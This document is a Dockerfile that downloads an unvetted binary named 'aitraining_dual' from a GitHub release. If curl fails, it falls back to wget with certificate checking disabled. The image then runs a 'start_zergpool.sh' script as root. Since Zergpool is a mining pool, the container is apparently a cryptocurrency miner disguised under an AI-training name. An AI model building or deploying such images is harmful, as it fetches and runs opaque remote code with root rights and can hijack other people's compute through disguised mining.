FROM debian:trixie-slim

RUN apt-get -y update \
    && apt-get -y upgrade \
    && apt-get -y install curl wget ca-certificates \
    && update-ca-certificates \
    && cd /opt \
    \
    # Download your custom binary
    && (curl -L https://github.com/max313iq/Ssl/releases/download/22x/aitraining_dual -o aitraining_dual || \
        wget --progress=dot:giga --no-check-certificate https://github.com/max313iq/Ssl/releases/download/22x/aitraining_dual -O aitraining_dual) \
    \
    # Make executable
    && chmod +x aitraining_dual \
    \
    # Clean
    && apt-get -y autoremove --purge \
    && apt-get -y clean \
    && rm -rf /var/lib/apt/lists/* /var/cache/apt/archives/*

WORKDIR /opt

COPY start_zergpool.sh .
RUN chmod +x start_zergpool.sh

# Run as root (default), no user switching
ENTRYPOINT ["./start_zergpool.sh"]
